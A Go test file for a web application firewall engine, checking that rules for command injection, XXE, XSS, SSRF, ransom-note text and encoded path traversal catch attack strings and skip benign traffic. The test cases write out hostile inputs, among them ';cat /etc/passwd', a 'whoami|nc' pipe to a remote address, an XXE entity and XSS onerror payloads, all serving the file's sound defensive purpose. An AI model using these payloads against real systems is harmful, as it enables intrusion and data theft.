package engine

import (
	"strconv"
	"strings"
	"testing"
)

// CMDi-001 and RANSOM-003 matched inside ordinary real traffic (wafeval on
// the Tranco crawl); these pin what each must and must not match.
func TestCMDi001AndRANSOM003(t *testing.T) {
	e := New(Config{BlockThreshold: 10})
	fired := func(id, s string) bool {
		ms, _ := e.MatchRulesScored(NormalizeInput(s))
		for _, m := range ms {
			if m.RuleID == id {
				return true
			}
		}
		return false
	}
	for _, c := range []struct {
		id, in string
		want   bool
	}{
		{"CMDi-001", "http://x.example/p?x=1; id", true},
		{"CMDi-001", "http://x.example/p?x=1;cat /etc/passwd", true},
		{"CMDi-001", "http://x.example/p?x=a;ls -la", true},
		{"CMDi-001", "http://x.example/p?x=a;whoami|nc 10.0.0.1 9", true},
		{"CMDi-001", "https://ad.doubleclick.net/activity;src=123;type=sales;cat=checkout;ord=1", false},
		{"CMDi-001", "https://x.example/a;idx=4;catalog=books", false},
		{"RANSOM-003", "send 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2 to recover", true},
		{"RANSOM-003", "pay to bitcoincash:qpm2qsznhks23z7629mms6s4cwef74vcwvy22gdx6a now", true},
		{"RANSOM-003", "addr=3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy&x=1", true},
		{"RANSOM-003", "euconsent=CPxx3abtkeIRf91hr7sQhBgaIEmAFjBuQZIwG1BkEAmQ6MyNJk2NgAggAiCUChAKAkAIARAQOIABEgZ", false},
		{"RANSOM-003", "//3j98t1wpez73cnmqviecrnyiwrnqrhw.com:443", false},
		{"RANSOM-003", "tok=eyJhbGciOiJIUzI1NiJ9/1YJlEIAwCwUBJIsAgAgCAAgAACBKAIIgEAG/x", false},
	} {
		if got := fired(c.id, c.in); got != c.want {
			t.Errorf("%s on %q: fired=%v want %v", c.id, c.in, got, c.want)
		}
	}
}

func TestXXE004AndPROTO005(t *testing.T) {
	// XXE-004 runs on the normalized text and on the raw URL (the rescan),
	// where its false positives were: a hit on either counts.
	xxeNorm := rulePattern(t, "XXE-004")
	var xxeRaw func(string) bool
	for _, cr := range blockRules {
		for _, r := range cr.Rules {
			if r.ID == "XXE-004" {
				xxeRaw = r.Pattern.MatchString
			}
		}
	}
	xxe := func(s string) bool { return xxeNorm(s) || xxeRaw(s) }
	// PROTO-005 is reached by the raw-URL rescan (normalization decodes the
	// %XX it counts), so it is checked on the raw input.
	var proto func(string) bool
	for _, cr := range blockRules {
		for _, r := range cr.Rules {
			if r.ID == "PROTO-005" {
				proto = r.Pattern.MatchString
			}
		}
	}
	for s, want := range map[string]bool{
		`<!ENTITY % xxe SYSTEM "http://x/e.dtd"> %xxe;`: true,
		`%dtd; %file; %a;`:              true,
		"https://x.example/a%2F;b":      false,
		"https://x.example/t?c=%3A37;x": false,
		"https://x.example/t?c=%E3;x":   false,
	} {
		if got := xxe(s); got != want {
			t.Errorf("XXE-004 on %q: %v want %v", s, got, want)
		}
	}
	ascii := ""
	for _, c := range "/etc/passwd?x=1" {
		ascii += "%" + strings.ToUpper(strconv.FormatInt(int64(c), 16))
	}
	for s, want := range map[string]bool{
		"https://x.example/s?q=" + ascii:                                                        true,
		"https://x.example/s?q=%D0%9A%D0%B8%D0%BD%D0%BE%D1%82%D0%B5%D0%B0%D1%82%D1%80":          false,
		"https://x.example/s?q=%E3%82%BF%E3%83%9E%E3%83%81%E3%83%A3%E3%83%B3%E3%82%B7%E3%83%A7": false,
	} {
		if got := proto(s); got != want {
			t.Errorf("PROTO-005 on %q: %v want %v", s, got, want)
		}
	}
}

func TestUNI001SSRF009PROTO006(t *testing.T) {
	uni, ssrf := rulePattern(t, "UNI-001"), rulePattern(t, "SSRF-009")
	for s, want := range map[string]bool{
		"/p?u=\u200badmin":                true,
		"/p?u=ad\u200dmin":                true,
		"/media/ಡಿ\u200cಕೆ":               false, // Kannada with ZWNJ
		"/p?e=\U0001F468\u200d\U0001F469": false, // emoji ZWJ sequence
	} {
		if got := uni(s); got != want {
			t.Errorf("UNI-001 on %q: %v want %v", s, got, want)
		}
	}
	for s, want := range map[string]bool{
		"http://0177.0.0.1/":        true,
		"http://0x7f.1/x":           false, // starts with 0x: not this rule's form
		"http://017700000001/":      true,
		"https://001.com.ua/a.png":  false,
		"https://02.cdn.example/x":  false,
		"http://0177.0.0.01:8080/a": true,
	} {
		if got := ssrf(s); got != want {
			t.Errorf("SSRF-009 on %q: %v want %v", s, got, want)
		}
	}
	for _, cr := range blockRules {
		for _, r := range cr.Rules {
			if r.ID == "PROTO-006" && r.Severity != 0 {
				t.Errorf("PROTO-006 scores %d; it is observe-only", r.Severity)
			}
		}
	}
}

func TestXSS003ParameterNames(t *testing.T) {
	xss := rulePattern(t, "XSS-003")
	for s, want := range map[string]bool{
		`<img src=x onerror=alert(1)>`:                                                  true,
		`<svg/onload=alert(1)>`:                                                         true,
		`x" onmouseover="alert(1)`:                                                      true,
		`/s?q=%22%20onfocus%3Dalert(1)%20autofocus`:                                     true,
		"https://www.google.com/recaptcha/api.js?onload=cb&render=explicit":             false,
		"https://challenges.cloudflare.com/turnstile/v0/api.js?a=1&onload=cb":           false,
		"https://x.example/cdn-cgi/image/quality=90,onerror=redirect,format=avif/a.jpg": false,
	} {
		if got := xss(s); got != want {
			t.Errorf("XSS-003 on %q: %v want %v", s, got, want)
		}
	}
}

func TestSSRF002HostBoundary(t *testing.T) {
	ssrf := rulePattern(t, "SSRF-002")
	for s, want := range map[string]bool{
		"/fetch?u=http://localhost/admin":        true,
		"/fetch?u=http://localhost:8080/":        true,
		"/fetch?u=http://127.0.0.1/":             true,
		"/fetch?u=http://10.1.2.3?x=1":           true,
		"/fetch?u=http://localhost":              true,
		"https://localhost.sensic.net:54325/":    false,
		"/r?u=https://10.20.30.40.nip.example/x": false,
	} {
		if got := ssrf(s); got != want {
			t.Errorf("SSRF-002 on %q: %v want %v", s, got, want)
		}
	}
}
